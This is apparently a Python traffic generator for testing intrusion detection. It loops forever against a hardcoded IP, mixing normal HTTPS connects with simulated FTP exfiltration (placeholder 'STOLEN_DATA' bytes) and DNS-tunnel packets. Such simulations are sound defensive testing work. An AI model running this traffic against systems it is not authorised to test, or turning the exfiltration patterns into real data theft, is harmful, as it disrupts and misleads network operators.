import socket
import time
import random

TARGET_IP = "100.120.229.46"

def simulate_normal():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        s.connect((TARGET_IP, 443))
        s.close()
    except: pass

def simulate_ftp_exfil():
    print("🔴 [BREACH] Firing Massive FTP Exfiltration (Port 21)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, 21))
        s.send(b"STOLEN_DATA" * 500)
        s.close()
    except: pass

def simulate_dns_tunnel():
    print("🔴 [BREACH] Firing DNS Tunneling (Port 53)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b"base64_encoded_data", (TARGET_IP, 53))
    except: pass

if __name__ == "__main__":
    print(f"🌐 INITIATING BREACH TRAFFIC MIX ON {TARGET_IP}")
    while True:
        if random.randint(1, 100) <= 70:
            simulate_normal()
        else:
            random.choice([simulate_ftp_exfil, simulate_dns_tunnel])()
        time.sleep(random.uniform(0.5, 2.0))